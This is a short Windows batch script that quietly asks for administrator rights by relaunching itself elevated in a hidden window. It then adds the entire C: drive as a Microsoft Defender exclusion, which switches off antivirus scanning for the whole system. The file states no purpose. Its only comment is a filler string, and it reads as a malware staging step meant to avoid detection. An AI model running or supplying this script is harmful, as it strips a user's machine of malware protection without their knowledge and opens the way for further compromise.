@echo off
:requestPrivileges
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process -WindowStyle Hidden -File '%~f0' -Verb runAs"
    exit /b
)

rem ssss
start /b powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"
exit